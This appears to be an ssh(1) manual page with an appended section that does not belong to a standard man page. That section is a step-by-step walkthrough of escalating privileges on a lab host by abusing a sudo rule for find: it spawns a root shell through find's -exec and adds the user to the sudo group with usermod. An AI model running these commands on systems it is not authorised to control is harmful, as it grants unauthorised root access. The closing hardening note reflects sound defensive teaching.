	SSH(1) General Commands Manual SSH(1)

	NAME
	ssh – OpenSSH remote login client

	SYNOPSIS
	ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]
		[-b bind_address] [-c cipher_spec] [-D [bind_address:]port]
		[-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]
		[-i identity_file] [-J destination] [-L address]
		[-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option]
		[-p port] [-Q query_option] [-R address] [-S ctl_path]
		[-W host:port] [-w local_tun[:remote_tun]] destination [command]

	DESCRIPTION
		ssh (SSH client) is a program for logging into a remote machine and for
		executing commands on a remote machine. It provides secure encrypted
		communications between two untrusted hosts over an insecure network.
		X11 connections, arbitrary TCP ports and UNIX-domain sockets can also be
		forwarded over the secure channel.

		ssh connects and logs into the specified destination, which may be
		specified as either [user@]hostname or a URI of the form
		ssh://[user@]hostname[:port]. The user must prove his/her identity to
		the remote machine using one of several methods (see below).

		If a command is specified, it is executed on the remote host instead of
		a login shell.

		The options are as follows:

		-p port
		Port to connect to on the remote host. This can be specified on
		a per-host basis in the configuration file.

		[ ... other common options ... ]

	EXIT STATUS
		ssh exits with the exit status of the remote command or with 255 if an
		error occurred.

	EXAMPLES AND COMMON POST‑LOGIN PRIVILEGE ESCALATION SCENARIO
		The following scenario illustrates how a user, after establishing an SSH
		session, may enumerate available sudo privileges and leverage them to
		gain elevated access. The commands shown are executed inside the remote
		shell; the SSH connection parameters are given first.

		Assume the credentials john / pass are known.

		Connect to the user:
		ssh -p 2002 john@127.0.0.1

		Once logged in, attempt to become root immediately – it fails because
		john lacks direct sudo rights:
		sudo su

		Check which commands john may run with sudo:
		sudo -l

		The output indicates that john can run find under sudo without being
		prompted for the root password. Verify whether this privilege can be
		exploited:
		sudo find /home -exec id ;

		For every file or directory found under /home (two items exist there),
		the command id is executed. The uid and gid printed by id show the
		effective user: a numeric id above 1000 corresponds to a regular user,
		while 0 indicates root. The output returns 0, meaning that the commands
		given with -exec run with root privileges.

		Use this to obtain a root shell or directly modify group membership:

		Option 1 – spawn a root shell, then add john to the sudo group
		sudo find /home/ -exec /bin/sh \;
		sudo usermod -aG sudo john

		Option 2 – add john to the sudo group in a single step
		sudo find /home/ -exec usermod -aG sudo john \;

		IMPORTANT: After modifying group membership, the user must disconnect
		and reconnect via SSH for the new group rights to take effect.

		After reconnecting, verify that john can now use sudo to become root:
		sudo su
		Supply john's password (pass) when prompted. If the prompt changes to
		a root shell, the privilege escalation was successful.

		Note: The ability to run find with sudo is dangerous because find‘s
		-exec flag can be used to execute arbitrary commands. Administrators
		should carefully restrict sudo rules to avoid such privilege escalation
		paths.
